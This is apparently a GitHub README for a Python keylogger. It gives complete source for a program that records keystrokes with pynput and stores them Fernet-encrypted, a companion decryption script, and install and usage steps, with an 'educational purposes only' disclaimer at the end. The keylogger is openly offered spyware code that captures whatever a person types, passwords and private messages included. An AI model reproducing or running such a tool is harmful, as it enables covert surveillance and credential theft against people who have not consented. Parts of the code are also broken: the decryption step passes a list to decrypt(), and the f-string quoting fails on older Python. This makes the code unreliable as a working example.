# Keylogger with encryption
## Description
This project consist of two programs: one for logging key presses and another for decrypting the logged data. The programs are written in Python and use the `pynput` library to capture key presses and the `cryptography` library for encrypting and decrypting data.
# Code
## Keylogger Program (keylogger.py)
``` python 
from pynput import keyboard
import datetime
from cryptography.fernet import Fernet

# Generate encryption key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Save key to file 
with open('key.key', 'wb') as f:
    f.write(key)

buffer = []

def on_press(key):
    global buffer 
    if key == keyboard.Key.space:
        # Create a log with the current time and buffer content, then encrypt it
        log = f'[{datetime.datetime.now().strftime('%Y-%m-%d, %H:%M:%S')}] {"".join(buffer)}\n'
        encrypted_logs = cipher_suite.encrypt(log.encode())
        with open('klogs.txt', 'ab') as f: # Opening the file in append binary mode
            f.write(encrypted_logs + b'\n')
        buffer = []
    else:
        try:
            if key.char.isalpha():  # Check if the pressed key is a letter
                buffer.append(key.char)
            else:
                buffer.append(str(key).replace("'", ""))
        except AttributeError:  # Ignore non-character keys like Shift, Ctrl.
           pass 
# Checking if the pressed key is esc if so stop listening key presses
def on_release(key):
    if key == keyboard.Key.esc:
        return False 
        
with keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join() # Start listening to key presses
```
### Explanation
1. `Imports`: 
Import necessary modules to keyboard events, handling dates and encrypted data.
2. `Encryption Key`:
Generate and save an encryption key for secure data storage.
3. `Buffer`:
A list to collect characters typed by the user.
4. `on_press Function`:
Handles key press events, appends characters to a buffer and writes encrypted logs to a file when the space bar is pressed.
5. `on_release Function`:
Stops listening for a key presses when the Esc key is pressed.
6.  `Listener`:
Initialazes and starts the keyboard listener to call the defined functions on key events.
## Log decryption Program (decryption.py)
``` python
from cryptography.fernet import Fernet

# Load encryption key
with open('key.key', 'rb') as f:
    key = f.read()
    
cipher_suite = Fernet(key)

# Decrypt logs
with open('klogs.txt', 'rb') as f:
    encrypted_logs = f.readlines()
    
decrypted_logs = []
decrypted_logs = cipher_suite.decrypt(encrypted_logs)

# Save decrypted logs to a file
with open('decrypted_logs.txt','w') as f:
   f.write(decrypted_logs.decode())
```
## Requirements
- Python 3.x
- Libraries:
 `pynput`, `cryptography`
## Instalation
1. Clone the repository:
   ``` bash
   git clone https://github.com/hackbutnotme/Keylogger
   ```
2. Install the required libraries:
   ``` bash
   pip install pynput
   pip install cryptography
   ```
## Usage
1. Run the keylogger.py:
   ``` bash
   python keylogger.py
   
   # The program will run in the background, logging key presses.
    ```
2. After logging key presses and saving them to `klogs.txt`, run the fecryptor program:
    ``` bash
    python decryption.py
    # The decrypted logs will be saved to `decrytped_logs.txt`.
    ```
## WARNING
This project is intended for educational purposes only. Using such tools to monitor the activities of others without their consent is illegal and unethical. Please use this project responsibly.
